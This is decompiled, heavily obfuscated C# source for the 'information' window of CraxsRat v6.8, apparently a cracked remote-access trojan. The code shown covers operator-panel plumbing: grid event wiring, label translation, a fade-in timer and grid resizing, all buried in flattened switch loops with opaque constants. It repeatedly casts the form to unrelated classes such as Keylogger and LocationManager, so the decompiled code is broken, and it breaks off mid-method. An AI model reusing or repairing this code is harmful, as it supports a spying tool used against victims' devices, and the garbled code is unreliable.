// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.information
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class information : Form
  {
    private IContainer components;

    internal virtual Panel Panel1
    {
      get => ((Keylogger) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Keylogger) this)._Panel1 = value;
    }

    internal virtual DataGridView DGV3
    {
      get => ((Keylogger) this)._DGV3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV3_CellEnter);
label_1:
        int num1 = 478987459;
        DataGridView dgV3;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-~(num1 * 364386013) ^ --2074277023 * -1869002473)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              dgV3 = ((Keylogger) this)._DGV3;
              int num3 = dgV3 == null ? 1476845418 : (num3 = 704043461);
              num1 = num3 ^ (int) num2 * 446104313;
              continue;
            case 2:
              dgV3.CellEnter -= cellEventHandler;
              num1 = (int) num2 * 43698862 ^ -1158930693;
              continue;
            case 3:
              goto label_1;
            case 4:
              dgV3.CellEnter += cellEventHandler;
              num1 = (int) num2 * 1161837264 ^ -466212004;
              continue;
            case 5:
              ((Keylogger) this)._DGV3 = value;
              dgV3 = ((Keylogger) this)._DGV3;
              int num4;
              num1 = num4 = dgV3 == null ? -1199074212 : (num4 = 1420140888);
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Label LB4
    {
      get => ((Keylogger) this)._LB4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Keylogger) this)._LB4 = value;
    }

    internal virtual DataGridView DGV2
    {
      get => ((Keylogger) this)._DGV2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV2_CellEnter);
        DataGridView dgV2 = ((Keylogger) this)._DGV2;
        if (dgV2 == null)
          goto label_7;
label_1:
        int num1 = -1499313076;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (1761299688 - 1149090626 - ~(num2 - ((352898016 - 1366395045) * 1246540397 + ~~1670372228 + -1912337699 * -1134572685 - 1590418399 * ~(-1420699673 * -1309912359 ^ 1882262929 * 1938921419)) - ((-697453504 ^ ~-2097445887 + 65070617) + ((833013633 - 686069788 ^ -823270465 ^ 824476305) + -2095117499 * (-1787334545 - -230288009)))) * -1049287521 - 1581574125)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              dgV2.CellEnter -= cellEventHandler;
              num1 = (int) num3 * -798443241 ^ 1516059184;
              continue;
            case 2:
              dgV2.CellEnter += cellEventHandler;
              num1 = (int) num3 * -510912693 ^ 659551560;
              continue;
            case 3:
              goto label_1;
            case 4:
              int num4 = dgV2 == null ? 1608367915 : (num4 = -1412820354);
              num1 = num4 ^ (int) num3 * -1559785001;
              continue;
            case 5:
              goto label_7;
            case 6:
              dgV2 = ((Keylogger) this)._DGV2;
              num1 = (int) num3 * 1874050772 ^ 232525423;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_7:
        ((Keylogger) this)._DGV2 = value;
        num1 = 1129517237;
        goto label_2;
      }
    }

    internal virtual Label LB3
    {
      get => ((Keylogger) this)._LB3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Keylogger) this)._LB3 = value;
    }

    internal virtual DataGridView DGV1
    {
      get => ((Keylogger) this)._DGV1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV1_CellEnter);
label_1:
        int num1 = 77750495;
        DataGridView dgV1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (--(-num1 + (~(~-841484581 ^ -1716358884) ^ -497611997) ^ -(~669246526 + (-2033722853 - 619925219))) - 1964485724)) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = dgV1 == null ? -1827323820 : (num3 = 1423437715);
              num1 = num3 ^ (int) num2 * 2044264589;
              continue;
            case 2:
              ((Keylogger) this)._DGV1 = value;
              dgV1 = ((Keylogger) this)._DGV1;
              num1 = -1736462814;
              continue;
            case 3:
              dgV1.CellEnter -= cellEventHandler;
              num1 = (int) num2 * -1619203646 ^ -990950827;
              continue;
            case 4:
              int num4 = dgV1 == null ? -412171309 : (num4 = -111084996);
              num1 = num4 ^ (int) num2 * -1211489064;
              continue;
            case 5:
              dgV1.CellEnter += cellEventHandler;
              num1 = (int) num2 * 292151823 ^ 46261522;
              continue;
            case 6:
              dgV1 = ((Keylogger) this)._DGV1;
              num1 = (int) num2 * 1687293426 ^ 1026407081;
              continue;
            case 7:
              goto label_1;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label LB2
    {
      get => ((Keylogger) this)._LB2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Keylogger) this)._LB2 = value;
    }

    internal virtual DataGridView DGV0
    {
      get => ((Keylogger) this)._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV0_CellEnter);
label_1:
        int num1 = 1824656768;
        DataGridView dgV0;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(-(num1 + (-674204501 * --(786254948 - 213429254) - 1576606721 * ~~-1775964025)) + ~(1279730867 + 1902185295 + ~-1736178344)) * -1533156689 ^ 1651542031)) % 8U)
          {
            case 0:
              dgV0.CellEnter += cellEventHandler;
              num1 = (int) num2 * -814944168 ^ -1830350735;
              continue;
            case 1:
              dgV0.CellEnter -= cellEventHandler;
              num1 = (int) num2 * 1735231729 ^ 1906203890;
              continue;
            case 2:
              int num3 = dgV0 == null ? 1553332309 : (num3 = 1972261761);
              num1 = num3 ^ (int) num2 * -909559630;
              continue;
            case 3:
              dgV0 = ((Keylogger) this)._DGV0;
              num1 = (int) num2 * -2071755606 ^ 233613596;
              continue;
            case 4:
              goto label_3;
            case 5:
              int num4 = dgV0 == null ? -1096240643 : (num4 = -1435839464);
              num1 = num4 ^ (int) num2 * 629448126;
              continue;
            case 6:
              ((Keylogger) this)._DGV0 = value;
              dgV0 = ((Keylogger) this)._DGV0;
              num1 = 377455607;
              continue;
            case 7:
              goto label_1;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label LB1
    {
      get => ((Keylogger) this)._LB1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Keylogger) this)._LB1 = value;
    }

    internal virtual DataGridView DGV4
    {
      get => ((Keylogger) this)._DGV4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV4_CellEnter);
label_1:
        int num1 = -1837268663;
        DataGridView dgV4;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 - ~((1813033013 - 937065242 ^ 1297633936 ^ 279249374) + ~1868744690 + ((-1941246895 * 2127244705 ^ -1880710551) - 714962485)) - (-1086780216 - -1144506752 + (924656051 - 1704732455) + (1073683463 ^ -315298971 ^ 208296505 ^ 1292945157) - -~2058478349 * 542048391))) % 7U)
          {
            case 0:
              int num3 = dgV4 == null ? -1856061748 : (num3 = 1207310985);
              num1 = num3 ^ (int) num2 * 2121851073;
              continue;
            case 1:
              dgV4 = ((Keylogger) this)._DGV4;
              num1 = (int) num2 * 893301375 ^ 1541749647;
              continue;
            case 2:
              dgV4.CellEnter += cellEventHandler;
              num1 = (int) num2 * -981575485 ^ 524836468;
              continue;
            case 3:
              goto label_1;
            case 4:
              ((Keylogger) this)._DGV4 = value;
              dgV4 = ((Keylogger) this)._DGV4;
              int num4;
              num1 = num4 = dgV4 == null ? -1704300272 : (num4 = -1018535875);
              continue;
            case 5:
              goto label_3;
            case 6:
              dgV4.CellEnter -= cellEventHandler;
              num1 = (int) num2 * 796044672 ^ -793706634;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Label LB5
    {
      get => ((Keylogger) this)._LB5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Keylogger) this)._LB5 = value;
    }

    internal virtual DataGridView DGV5
    {
      get => ((Keylogger) this)._DGV5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV5_CellEnter);
        DataGridViewCellCancelEventHandler cancelEventHandler = new DataGridViewCellCancelEventHandler(this.DGV5_CellBeginEdit);
label_1:
        int num1 = 593979058;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridView dgV5;
          DataGridViewEditingControlShowingEventHandler showingEventHandler;
          switch ((num3 = (uint) ((~~-168214052 - (num2 + 1271871383 * -((1511509547 + 1938914343) * -1348140537 - 1660956093 * --309766032))) * 489006059 - (948498541 - 2053159029 - (1169080497 - 1427616861)))) % 9U)
          {
            case 0:
              dgV5.EditingControlShowing += showingEventHandler;
              num1 = (int) num3 * 2010891619 ^ 534035863;
              continue;
            case 1:
              int num4 = dgV5 == null ? -1777150140 : (num4 = -283437611);
              num1 = num4 ^ (int) num3 * 1122804268;
              continue;
            case 2:
              dgV5.CellEnter += cellEventHandler;
              dgV5.CellBeginEdit += cancelEventHandler;
              num1 = (int) num3 * 1988215438 ^ -799051803;
              continue;
            case 3:
              goto label_1;
            case 4:
              dgV5 = ((Keylogger) this)._DGV5;
              int num5 = dgV5 == null ? -1316129404 : (num5 = 1666210081);
              num1 = num5 ^ (int) num3 * 2133715187;
              continue;
            case 5:
              ((Keylogger) this)._DGV5 = value;
              dgV5 = ((Keylogger) this)._DGV5;
              num1 = 588999644;
              continue;
            case 6:
              showingEventHandler = new DataGridViewEditingControlShowingEventHandler(this.DGV5_EditingControlShowing);
              num1 = (int) num3 * -1961200651 ^ -1590036077;
              continue;
            case 7:
              dgV5.CellEnter -= cellEventHandler;
              dgV5.CellBeginEdit -= cancelEventHandler;
              dgV5.EditingControlShowing -= showingEventHandler;
              num1 = (int) num3 * -1151879968 ^ 1874935883;
              continue;
            case 8:
              goto label_3;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual Label LB6
    {
      get => ((Keylogger) this)._LB6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Keylogger) this)._LB6 = value;
    }

    internal virtual DataGridView DGV6
    {
      get => ((Keylogger) this)._DGV6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV6_CellEnter);
label_1:
        int num1 = -1188438107;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridView dgV6;
          DataGridViewCellCancelEventHandler cancelEventHandler;
          DataGridViewEditingControlShowingEventHandler showingEventHandler;
          switch ((num3 = (uint) -((928599647 - ~-1361989849 - (1807931150 - 1357449865 ^ -1012217032) - (num2 ^ -~(-5768238 - 1233096429)) * 2068164989 - -(-1165128555 - -1881689023)) * -784596521)) % 10U)
          {
            case 0:
              dgV6.CellBeginEdit += cancelEventHandler;
              dgV6.EditingControlShowing += showingEventHandler;
              num1 = (int) num3 * -1980833217 ^ 1303730547;
              continue;
            case 1:
              cancelEventHandler = new DataGridViewCellCancelEventHandler(this.DGV6_CellBeginEdit);
              num1 = (int) num3 * 679016351 ^ -1863463366;
              continue;
            case 2:
              dgV6.CellEnter += cellEventHandler;
              num1 = (int) num3 * -226746087 ^ -1445968476;
              continue;
            case 3:
              goto label_3;
            case 4:
              goto label_1;
            case 5:
              ((Keylogger) this)._DGV6 = value;
              num1 = 1478166045;
              continue;
            case 6:
              dgV6.CellEnter -= cellEventHandler;
              dgV6.CellBeginEdit -= cancelEventHandler;
              num1 = (int) num3 * -1760512018 ^ 1460720120;
              continue;
            case 7:
              dgV6 = ((Keylogger) this)._DGV6;
              int num4 = dgV6 == null ? 1310243046 : (num4 = -1946310003);
              num1 = num4 ^ (int) num3 * -811990659;
              continue;
            case 8:
              dgV6.EditingControlShowing -= showingEventHandler;
              num1 = (int) num3 * -1894579464 ^ -510909105;
              continue;
            case 9:
              showingEventHandler = new DataGridViewEditingControlShowingEventHandler(this.DGV6_EditingControlShowing);
              dgV6 = ((Keylogger) this)._DGV6;
              int num5 = dgV6 == null ? -2071560301 : (num5 = -1780011026);
              num1 = num5 ^ (int) num3 * -680317716;
              continue;
            default:
              goto label_12;
          }
        }
label_3:
        return;
label_12:;
      }
    }

    internal virtual Label LB7
    {
      get => ((Keylogger) this)._LB7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Keylogger) this)._LB7 = value;
    }

    internal virtual System.Windows.Forms.Timer TOpacity
    {
      get => ((Keylogger) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = -2115879190;
        System.Windows.Forms.Timer topacity;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -~~(~(num1 - (-1381307661 - -1369540250 - (2111533945 ^ -2056759934) - 1598980770 ^ ~592839078 * 1070409665 - 1791662071 ^ -(1963599606 + 59951342))) ^ 916021502)) % 8U)
          {
            case 0:
              topacity = ((Keylogger) this)._TOpacity;
              num1 = (int) num2 * 70826839 ^ 602144576;
              continue;
            case 1:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * 1393993973 ^ 1543109144;
              continue;
            case 2:
              ((Keylogger) this)._TOpacity = value;
              num1 = 1795513431;
              continue;
            case 3:
              topacity = ((Keylogger) this)._TOpacity;
              int num3 = topacity == null ? 1087133472 : (num3 = -1837503839);
              num1 = num3 ^ (int) num2 * -1096724617;
              continue;
            case 4:
              goto label_3;
            case 5:
              int num4 = topacity == null ? 1126768973 : (num4 = 136453280);
              num1 = num4 ^ (int) num2 * -109524322;
              continue;
            case 6:
              goto label_1;
            case 7:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * 1105294612 ^ -964980457;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn6
    {
      get => ((Keylogger) this)._DataGridViewTextBoxColumn6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Keylogger) this)._DataGridViewTextBoxColumn6 = value;
      }
    }

    internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn1
    {
      get => ((Keylogger._Closure\u0024__) this)._DataGridViewComboBoxColumn1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Keylogger._Closure\u0024__) this)._DataGridViewComboBoxColumn1 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn5
    {
      get => ((Keylogger._Closure\u0024__) this)._DataGridViewTextBoxColumn5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Keylogger._Closure\u0024__) this)._DataGridViewTextBoxColumn5 = value;
      }
    }

    internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn3
    {
      get => ((Keylogger._Closure\u0024__) this)._DataGridViewComboBoxColumn3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Keylogger._Closure\u0024__) this)._DataGridViewComboBoxColumn3 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn4
    {
      get => ((LocationManager) this)._DataGridViewTextBoxColumn4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((LocationManager) this)._DataGridViewTextBoxColumn4 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column3
    {
      get => ((LocationManager) this)._Column3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((LocationManager) this)._Column3 = value;
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn3
    {
      get => ((LocationManager) this)._DataGridViewTextBoxColumn3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((LocationManager) this)._DataGridViewTextBoxColumn3 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column4
    {
      get => ((LocationManager) this)._Column4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((LocationManager) this)._Column4 = value;
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn2
    {
      get => ((LocationManager) this)._DataGridViewTextBoxColumn2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((LocationManager) this)._DataGridViewTextBoxColumn2 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column5
    {
      get => ((LocationManager) this)._Column5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((LocationManager) this)._Column5 = value;
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn1
    {
      get => ((LocationManager) this)._DataGridViewTextBoxColumn1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((LocationManager) this)._DataGridViewTextBoxColumn1 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column6
    {
      get => ((LocationManager) this)._Column6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((LocationManager) this)._Column6 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column1
    {
      get => ((LocationManager) this)._Column1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((LocationManager) this)._Column1 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column2
    {
      get => ((LocationManager) this)._Column2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((LocationManager) this)._Column2 = value;
    }

    internal virtual ContextMenuStrip ctxMenu
    {
      get => ((LocationManager) this)._ctxMenu;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((LocationManager) this)._ctxMenu = value;
    }

    internal virtual ToolStripMenuItem SaveToolStripMenuItem
    {
      get => ((LocationManager) this)._SaveToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveToolStripMenuItem_Click);
label_1:
        int num1 = -659269685;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) ~~(~-(~((~~-1452365471 ^ -330446641 * (-1973391943 - 1381952684)) - 2137046973 * (-653272308 - 1378054650)) - num2) ^ -498648969 * 313518983 + --894779804)) % 7U)
          {
            case 0:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 1283843688 ^ 382128255;
              continue;
            case 1:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -1964242692 ^ 179243771;
              continue;
            case 2:
              int num4 = toolStripMenuItem == null ? -1593755484 : (num4 = -553441841);
              num1 = num4 ^ (int) num3 * 1686015509;
              continue;
            case 3:
              ((LocationManager) this)._SaveToolStripMenuItem = value;
              toolStripMenuItem = ((LocationManager) this)._SaveToolStripMenuItem;
              int num5;
              num1 = num5 = toolStripMenuItem == null ? -497624405 : (num5 = 1943567285);
              continue;
            case 4:
              goto label_1;
            case 5:
              toolStripMenuItem = ((LocationManager) this)._SaveToolStripMenuItem;
              num1 = (int) num3 * 1631108454 ^ 606107288;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
    {
      get => ((LocationManager) this)._SaveAsToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveAsToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((LocationManager) this)._SaveAsToolStripMenuItem;
label_1:
        int num1 = -488035734;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((-1531716107 ^ 100570395 - -673915075) - ((-1821343740 ^ 1786191466) - -1360779281) - ~num2 * -754329789)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              int num4 = toolStripMenuItem == null ? -135792978 : (num4 = 1128424430);
              num1 = num4 ^ (int) num3 * -1279347046;
              continue;
            case 2:
              ((LocationManager) this)._SaveAsToolStripMenuItem = value;
              toolStripMenuItem = ((LocationManager) this)._SaveAsToolStripMenuItem;
              num1 = 1065636433;
              continue;
            case 3:
              goto label_1;
            case 4:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -845661166 ^ -472689570;
              continue;
            case 5:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 539366303 ^ 2112804929;
              continue;
            case 6:
              int num5 = toolStripMenuItem == null ? -905953350 : (num5 = -1359120091);
              num1 = num5 ^ (int) num3 * 956553460;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    public information()
    {
      this.Load += new EventHandler(this.info_Load);
      ((LocationManager) this).Title = EXGuarder.\u0032217722F;
      ((LocationManager) this).tmpTable = (DataTable) null;
      ((LocationManager) this).DS = (DataSet) null;
      ((Icons) this).InitializeComponent();
      this.Font = Settings.f;
    }

    private void translateme()
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = 1364107905;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~-(num1 ^ --((1219806187 - 574032781 ^ -153969439 * 1935934326) + (559120519 * -1921889387 - (675770845 + 1635402656)))) + (-81800936 ^ -1435291196 - 79487375) ^ -1424743574 - -1993643611) - -1444589336)) % 14U)
        {
          case 0:
            goto label_1;
          case 1:
            int num3 = Microsoft.VisualBasic.CompilerServices.Operators.CompareString(language, EXGuarder.\u00374355347, false) != 0 ? 2062799439 : (num3 = -1928455814);
            num1 = num3 ^ (int) num2 * -2137761245;
            continue;
          case 2:
            this.LB1.Text = Codes.Translate(this.LB1.Text, EXGuarder.\u0036B074301, EXGuarder.\u0035D3A1420);
            num1 = (int) num2 * 924114762 ^ 1903195910;
            continue;
          case 3:
            this.LB4.Text = Codes.Translate(this.LB4.Text, EXGuarder.\u0036B074301, EXGuarder.\u0033F145C44);
            num1 = (int) num2 * 2058192870 ^ 932166511;
            continue;
          case 4:
            this.LB5.Text = Codes.Translate(this.LB5.Text, EXGuarder.\u0036B074301, EXGuarder.\u0035D3A1420);
            this.LB7.Text = Codes.Translate(this.LB7.Text, EXGuarder.\u0036B074301, EXGuarder.\u0035D3A1420);
            num1 = (int) num2 * -529736672 ^ -1947375725;
            continue;
          case 5:
            this.LB2.Text = Codes.Translate(this.LB2.Text, EXGuarder.\u0036B074301, EXGuarder.\u0035D3A1420);
            this.LB3.Text = Codes.Translate(this.LB3.Text, EXGuarder.\u0036B074301, EXGuarder.\u0035D3A1420);
            num1 = (int) num2 * -984941775 ^ -371427547;
            continue;
          case 6:
            this.LB6.Text = Codes.Translate(this.LB6.Text, EXGuarder.\u0036B074301, EXGuarder.\u0035D3A1420);
            num1 = (int) num2 * 1811505781 ^ 1629970438;
            continue;
          case 7:
            num1 = (int) num2 * -60819054 ^ 41085414;
            continue;
          case 8:
            int num4 = Microsoft.VisualBasic.CompilerServices.Operators.CompareString(language, EXGuarder.\u003766F2B46, false) == 0 ? -1480621871 : (num4 = -1288344932);
            num1 = num4 ^ (int) num2 * -270351165;
            continue;
          case 9:
            this.LB6.Text = Codes.Translate(this.LB6.Text, EXGuarder.\u0036B074301, EXGuarder.\u0033F145C44);
            this.LB7.Text = Codes.Translate(this.LB7.Text, EXGuarder.\u0036B074301, EXGuarder.\u0033F145C44);
            num1 = (int) num2 * 598321823 ^ 760059051;
            continue;
          case 10:
            this.LB5.Text = Codes.Translate(this.LB5.Text, EXGuarder.\u0036B074301, EXGuarder.\u0033F145C44);
            num1 = (int) num2 * 22952832 ^ 160961014;
            continue;
          case 11:
            this.LB4.Text = Codes.Translate(this.LB4.Text, EXGuarder.\u0036B074301, EXGuarder.\u0035D3A1420);
            num1 = (int) num2 * 173646580 ^ 322795583;
            continue;
          case 12:
            this.LB1.Text = Codes.Translate(this.LB1.Text, EXGuarder.\u0036B074301, EXGuarder.\u0033F145C44);
            this.LB2.Text = Codes.Translate(this.LB2.Text, EXGuarder.\u0036B074301, EXGuarder.\u0033F145C44);
            this.LB3.Text = Codes.Translate(this.LB3.Text, EXGuarder.\u0036B074301, EXGuarder.\u0033F145C44);
            num1 = 1054944834;
            continue;
          case 13:
            goto label_3;
          default:
            goto label_16;
        }
      }
label_3:
      return;
label_16:;
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_6;
label_1:
      int num1 = 1117650256;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-824095841 - (660637898 - 151654188) - ((num2 ^ ~513028403 - 1246663735 * (~1162544104 ^ ~(132160584 * -2098646653))) * -580905707 + (--2141967039 * -1579238199 + (-1961354190 - 1349427346 - -1780463369 * 1058113030)))) * 1798602299 ^ -1759189515)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num3 * 587365341 ^ -725625787;
            continue;
          case 2:
            goto label_6;
          case 3:
            this.Opacity += 0.1;
            num1 = (int) num3 * 299915060 ^ -1816693781;
            continue;
          case 4:
            goto label_3;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_6:
      this.TOpacity.Enabled = false;
      num1 = -505368881;
      goto label_2;
    }

    public void grreSize()
    {
      IEnumerator<DataGridView> enumerator;
      try
      {
        enumerator = this.Panel1.Controls.OfType<DataGridView>().GetEnumerator();
label_1:
        int num1 = 1034272457;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridView current;
          int num4;
          switch ((num3 = (uint) (~((~~-739006846 ^ ~(-349477367 ^ 1127986879)) - -(-445039349 - 139066211) - (995100625 + 1379471605) - num2 + (1392670015 - (~(785472683 ^ 1638088782) - (-999122285 - 485208198))) ^ 1887479223 ^ -1659242319 - 1119999633 + --826917454) * 1217247559)) % 7U)
          {
            case 0:
              current = enumerator.Current;
              num1 = -512179807;
              continue;
            case 1:
              num4 = checked (current.Rows.Count * current.Rows[0].Height);
              num1 = (int) num3 * 1518459419 ^ 215143906;
              continue;
            case 2:
              current.Height = checked (num4 + 5);
              num1 = (int) num3 * -995097186 ^ -2112446844;
              continue;
            case 3:
              num1 = (int) num3 * -904655945 ^ 107853570;
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_12;
            case 6:
              int num5;
              num1 = num5 = enumerator.MoveNext() ? 1782199364 : (num5 = 995211620);
              continue;
            default:
              goto label_8;
          }
        }
label_12:
        return;
label_8:;
      }
      finally
      {
        if (enumerator != null)
        {
label_10:
          int num6 = -1257449482;
          while (true)
          {
            int num7 = num6;
            uint num8;
            switch ((num8 = (uint) (~((~~-739006846 ^ ~(-349477367 ^ 1127986879)) - -(-445039349 - 139066211) - (995100625 + 1379471605) - num7 + (1392670015 - (~(785472683 ^ 1638088782) - (-999122285 - 485208198))) ^ 1887479223 ^ -1659242319 - 1119999633 + --826917454) * 1217247559)) % 3U)
            {
              case 0:
                goto label_10;
              case 1:
                enumerator.Dispose();
                num6 = (int) num8 * -1831052218 ^ 1942486768;
                continue;
              default:
                goto label_14;
            }
          }
        }
label_14:;
      }
    }

    private void info_Load(object sender, EventArgs e)
    {
      this.SaveToolStripMenuItem.Visible = true;
label_1:
      int num1 = -1561145037;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~((~num1 ^ -~(1509688233 * (-574921559 * -2138987566))) * 1488978807)) % 6U)
        {
          case 0:
            goto label_1;
          case 2:
            this.grreSize();
            num1 = (int) num2 * -1491540319 ^ -1646557196;
            continue;
          case 3:
            this.Text = ((LocationManager) this).Title;
            this.TOpacity.Interval = Settings.T_Interval;
            num1 = (int) num2 * 374468058 ^ 600245854;
            continue;
          case 4:
            this.SaveAsToolStripMenuItem.Visible = true;
            this.Icon = new Icon(Settings.res_Path + EXGuarder.\u0033877360E);
            num1 = (int) num2 * 433214971 ^ -879491222;
            continue;
          case 5:
            this.translateme();
            num1 = (int) num2 * 244809148 ^ 1111934993;
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      this.TOpacity.Enabled = true;
    }

    private void ClearSEL(DataGridView DG0)
    {
      IEnumerator<DataGridView> enumerator;
      try
      {
        enumerator = this.Panel1.Controls.OfType<DataGridView>().GetEnumerator();
label_6:
        int num1 = enumerator.MoveNext() ? -844163875 : (num1 = 1675997842);
        DataGridView current;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(((num1 ^ ~~(-1984061581 - -685009755 - -650554275 ^ -~1079073981)) + (76701685 - 1235720543 + (154249879 - ((1287352004 ^ 1785151029) - 1102263251 * -27993383)))) * 2002700831) * 2123738143 - 284650937)) % 7U)
          {
            case 0:
              goto label_12;
            case 1:
              current = enumerator.Current;
              num1 = 1353725196;
              continue;
            case 2:
              num1 = -844163875;
              continue;
            case 3:
              int num3 = current.Rows.Count <= 0 ? 1787210831 : (num3 = -484648948);
              num1 = num3 ^ (int) num2 * -699108829;
              continue;
            case 4:
              current.CurrentCell = current.Rows[0].Cells[0];
              current.ClearSelection();
              num1 = (int) num2 * -1487247733 ^ 1947219491;
              continue;
            case 5:
